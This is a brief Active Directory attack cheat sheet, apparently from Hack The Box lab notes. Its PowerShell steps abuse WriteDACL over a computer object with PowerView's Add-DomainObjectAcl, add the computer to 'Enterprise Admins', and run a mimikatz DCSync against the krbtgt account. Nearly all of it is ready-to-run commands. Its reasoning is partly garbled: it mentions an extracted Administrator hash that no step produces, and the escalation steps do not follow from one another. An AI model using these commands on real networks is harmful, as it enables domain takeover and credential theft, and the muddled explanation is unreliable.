# **Computers: Gain Full Control Over a Computer Object**

**Scenario:**  
You have `WriteDACL` over a computer object. Use it to grant full control.

**Steps:**

1. **Import PowerView**  
   ```powershell
   import-module .\powerview.ps1
   ```

2. **Set Up Credentials**  
   ```powershell
   $pass = convertto-securestring 'abc123!' -asplain -force
   $cred = new-object system.management.automation.pscredential('htb\MG', $pass)
   ```

3. **Modify DACL to Grant Full Control**  
   Grant full control over the target computer (e.g., `comp01`):
   ```powershell
   Add-DomainObjectAcl -TargetIdentity comp01 -Rights All -PrincipalIdentity MG -Credential $cred
   ```
   - **Why:** This allows modification of computer attributes or other interactions.

4. **Add the Computer to Another Group**  
   Add the computer object to a privileged group, such as "Enterprise Admins":
   ```powershell
   Add-ADGroupMember -Identity "Enterprise Admins" -Members comp01$
   ```
   This sequence shows how to extract secrets using your new account (`MG`) and leverage the extracted `Administrator` hash for privileged access.
   Or
   Use Mimikatz or similar tools to execute the DCSync attack:
   ```powershell
   mimikatz # lsadump::dcsync /user:krbtgt
   ```
